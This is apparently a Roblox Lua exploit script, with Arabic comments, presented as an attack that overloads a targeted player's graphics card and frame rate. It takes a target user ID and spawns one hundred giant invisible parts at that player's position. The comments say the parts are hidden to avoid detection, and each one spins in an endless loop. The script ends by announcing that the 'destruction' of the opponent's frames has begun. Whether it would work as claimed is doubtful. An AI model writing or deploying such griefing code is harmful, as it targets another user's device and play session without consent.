-- [[ 7ARBI SYSTEM: THE SHUTDOWN ]] --
-- الطريقة: إغراق ذاكرة الجرافيك (GPU) للخصم

local targetID = 10080511071 -- ضع الـ ID هنا
local runService = game:GetService("RunService")

-- وظيفة تخلق "ضغط" على معالج الخصم بدون ريموتات
local function OverloadEngine()
    for i = 1, 100 do
        local p = Instance.new("Part")
        p.Size = Vector3.new(1000, 1000, 1000) -- حجم عملاق
        p.Transparency = 1 -- مخفي عشان ما تنكشف
        p.CanCollide = false
        p.Position = game.Players:GetPlayerByUserId(targetID).Character.HumanoidRootPart.Position
        p.Parent = workspace
        
        -- إجبار جهاز الخصم على حساب فيزياء هذا الجسم
        task.spawn(function()
            while task.wait() do
                p.CFrame = p.CFrame * CFrame.Angles(0.1, 0.1, 0.1)
            end
        end)
    end
end

-- إطلاق الهجوم
OverloadEngine()
print("!!! تم بدء تدمير فريمات الخصم !!!")
